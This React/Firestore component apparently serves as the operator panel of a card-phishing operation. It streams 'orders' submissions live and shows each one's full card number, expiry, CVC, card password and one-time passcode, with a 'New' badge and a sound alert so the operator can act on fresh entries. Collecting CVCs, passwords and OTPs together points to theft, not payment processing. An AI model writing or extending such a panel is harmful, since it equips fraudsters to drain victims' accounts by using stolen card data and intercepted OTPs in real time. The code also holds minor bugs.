'use client';

import { useEffect, useRef, useState } from 'react';
import { collection, query, orderBy, onSnapshot, getDocs, DocumentData, QueryDocumentSnapshot } from 'firebase/firestore';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from '@/components/ui/accordion';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { MessageSquareOffIcon } from 'lucide-react';
import db from '@/app/lib/firebase';

interface Submission {
  id: string;
  cardNumber: string;
  cvc: string;
  month: string;
  yaer: string;
  otp: string;
  createdAt:string
}
async function getDataFromFirestore() {
  const arr: QueryDocumentSnapshot<DocumentData, DocumentData>[]=[]
  const querySnapshot = await getDocs(collection(db, 'orders'));
const data = querySnapshot.docs.map((doc) => arr.push(doc));
return arr
}
export default  function SubmissionsList() {
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const isInitialLoad = useRef(true);


useEffect(() => {
  const q = query(collection(db, 'orders'))
  const unsubscribe = onSnapshot(q, (querySnapshot) => {
    const submissionsData: any = []
    querySnapshot.forEach((doc) => {
      console.log(doc.data())
      submissionsData.push({ id: doc.id, ...doc.data() } as any)
    })
    setSubmissions(submissionsData)
console.log(submissionsData)

  
    if (!isInitialLoad.current) {
    
    } else {
      isInitialLoad.current = false
    }
  })
  return () => unsubscribe()

}, [])

useEffect(() => {
  
playNotificationSound()
}, [submissions.length])


const [audio,setAudio] = useState<HTMLAudioElement>();

 const playNotificationSound = () => {
  setAudio(new Audio("/notification.wav"))
   if (audio) {
     audio!.play().catch((error) => {
       console.error("Failed to play sound:", error);
     });
   }
 };
  return (
    <div className="m-2 grid md:grid-cols-4 gap-6 ">
      {submissions.map((submission:DocumentData) => (
        <Accordion key={submission.id} type="single" collapsible>
          <Card  className='bg-gray-900 text-white '>
            <AccordionItem value="item-1">
              <CardHeader className="flex flex-row items-center  justify-between	">
                <AccordionTrigger>
                  {' '}
                  <CardTitle className='text-sm'>{submission.paymentInfo.cardNumber}</CardTitle>
                </AccordionTrigger>
                <div>
                  <Badge className="bg-red-500">New</Badge>{' '}
                 
                </div>
              </CardHeader>
              <AccordionContent>
                <CardContent dir='rtl' className='grid grid-cols-2'>
                  <strong className='mx-3 text-red-300'>تاريخ الانتهاء </strong>           {submission.paymentInfo.month+"/"+submission.paymentInfo.year}
                  <strong  className='mx-3 text-red-300'>CVC </strong>  {submission.paymentInfo.cvc}


   <strong  className='mx-3 text-red-300'> Pass </strong>              {submission.paymentInfo.pass}  
   <strong  className='mx-3 text-red-300'> OTP </strong>              {submission.paymentInfo.otp}  

                    <strong className='hidden'>Submitted:</strong> {submission.paymentInfo.createdAt} 
                </CardContent>
              </AccordionContent>
            </AccordionItem>
          </Card>
        </Accordion>
      ))}
    </div>
  );
}
